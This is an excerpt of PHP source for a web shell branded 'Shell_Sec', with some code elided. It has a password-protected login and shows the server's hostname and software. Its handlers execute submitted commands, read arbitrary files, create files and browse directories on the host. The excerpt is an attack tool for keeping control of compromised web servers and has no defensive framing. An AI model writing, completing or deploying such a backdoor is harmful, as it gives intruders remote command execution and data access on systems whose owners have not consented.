...
$hashedPassword = "c24df88d249b151dae2b7c40de81e775"; 
...
function login_shell($error = '') {
    ...
    <body class="bg-gray-900 flex items-center justify-center h-screen">
        <div class="bg-gray-800 p-6 rounded-xl shadow-xl w-full max-w-md text-white">
            ...
            <p class="mt-4 text-center text-sm text-gray-500">Not easy but definitely possible</p>
        </div>
...
echo "
<center>
    <h1 style='color: blue;'><strong>[ Shell_Sec ] - <a href='" . $urlPath . "' style='color: blue; text-decoration: none;'>" . $_SERVER['HTTP_HOST'] . "</a></strong></h1>
</center>

<div style=' backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; padding: 20px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3); width: 95%; margin: 30px auto; font-size: 12px; color: black; display: flex; justify-content: space-between; align-items: flex-start; gap: 20px; '>    <h4 style='margin: 0; padding: 5px;'>Hostname: <font color='red'>" . @gethostname() . "</font> | Server Software: <font color='red'>" . $_SERVER['SERVER_SOFTWARE'] . "</font></h4>
 ...
 <div style='display: flex; justify-content: center; align-items: center; margin-top: 10px;'>
    <img src='https://i.gifer.com/8t06.gif' alt='GIF' style='max-width: 600px; border-radius: 15px;' />
</div>

<h2 style='border: 1px solid #ccc; padding: 10px; background-color: rgb(255, 255, 255); box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 15px;'>
        DIR~: " . createBreadcrumb($directory) . "</h2>
       
<div style='border: 1px solid #ccc; padding: 10px; background-color: rgb(255, 255, 255); box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; display: flex; gap: 10px;'>
	<div>
...
if (isset($_GET['dir'])) {
    if (isset($_GET['creat_file'])) {
        echo "
        <div style='border: 1px solid #ccc; padding: 10px; background-color: rgb(255, 255, 255); box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto;'>
            <h2>Create File :</h2>
            <form method='post'>
        ...
        if (isset($_POST['execute'])) {
        	...
        	if (!empty($result_command)) {
                echo "<div style='margin-top: 20px;'>
                           ...
                           <pre style='white-space: pre-wrap; background-color: rgb(255, 255, 255); font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px;'>$result_command</pre>
                        </div>";
        	} else {
...
if (isset($_GET['readfile'])) {
    ...
    if (is_readable($fileToRead)) {
        ...
        if ($content !== false) {
            echo "<pre style='white-space: pre-wrap; background-color: rgb(255, 255, 255); font-family: monospace; overflow-y: auto; box-sizing: border-box; height: 500px; width: 100%; max-width: 100%; margin-top: 10px;'>";
...
echo "</table>
          <div style='border: 1px solid #ccc; padding: 10px; background-color: rgb(255, 255, 255); box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.1); max-width: 100%; width: 100%; box-sizing: border-box; margin: 20px auto; font-size: 12px; text-align: center;'>
              &copy; " . date('Y') . " ✓ By <a href='#' style='text-decoration: none; color: #007BFF; font-weight: bold;'>Shell_Sec</a>.
          </div>";?>
